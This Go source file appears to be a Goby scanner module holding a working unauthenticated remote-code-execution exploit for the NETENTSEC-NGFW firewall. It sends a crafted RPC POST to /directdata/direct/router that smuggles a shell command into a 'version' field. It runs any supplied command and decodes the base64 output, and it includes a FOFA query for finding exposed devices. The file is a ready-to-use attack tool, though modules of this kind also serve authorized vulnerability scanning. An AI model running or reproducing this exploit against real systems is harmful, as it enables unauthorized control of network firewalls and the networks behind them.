package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NETENTSEC-NGFW firewall RCE",
    "Description": "NETENTSEC-NGFW has an unauthorized rce vulnerability. Attackers can use this vulnerability to execute code arbitrarily on the server side, write postscripts, obtain server permissions, and gain control of the entire web server.",
    "Product": "NETENTSEC-NGFW",
    "Homepage": "https://www.netentsec.com/",
    "DisclosureDate": "2021-04-08",
    "Author": "go0p",
    "FofaQuery": "app=\"网康科技-下一代防火墙\" || product=\"netentsec Technology - Next Generation Firewall\" || app=\"netentsec Technology - Next Generation Firewall\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "cmd",
            "Type": "input",
            "Value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "NETENTSEC-NGFW"
        ]
    },
    "PocId": "10242"
}`
	doPost := func(u *httpclient.FixUrl, cmd string) string {
		cfg := httpclient.NewPostRequestConfig("/directdata/direct/router")
		cfg.VerifyTls = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = fmt.Sprintf("{\"action\":\"Liveupdate_Software\",\"method\":\"getDownloadStatus\",\"data\":[{\"4.2.0\":{\"version\":\"4.2.0|%s\"}}],\"type\":\"rpc\",\"tid\":15}", cmd)
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		} else {
			return ""
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(8)
			pocStr := "echo " + randStr + "\\\"\\\"" + randStr
			if res := doPost(u, pocStr); res != "" && strings.Contains(res, randStr+randStr) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			// 解决 ifconfig 类有空格导致的回显不完全的问题
			expStr := cmd + "|base64 -w0"
			if res := doPost(expResult.HostInfo, expStr); res != "" {
				if wantStr := regexp.MustCompile(`"percent":"(.*?)",`).FindStringSubmatch(res); len(wantStr) > 0 {
					want, _ := base64.StdEncoding.DecodeString(wantStr[1])
					expResult.Output = string(want)
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
